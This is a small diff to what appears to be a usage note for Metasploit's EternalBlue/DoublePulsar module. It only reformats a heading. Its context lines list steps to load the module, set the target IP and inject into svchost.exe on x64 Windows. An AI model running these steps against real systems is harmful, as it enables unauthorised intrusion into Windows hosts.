@@ -17,9 +17,9 @@
 - reload_all 
 - use exploit/windows/smb/eternalblue_doublepulsar
 - show options
-
- * For Windows x64
- 
+- ###################
+ *# For Windows x64 #
+- ################### 
 -  RHOST (Target IP)
  - set PROCESSINJECT svchost.exe or et PROCESSINJECT svchost.exe
  - set TARGETARCHITECTURE x64
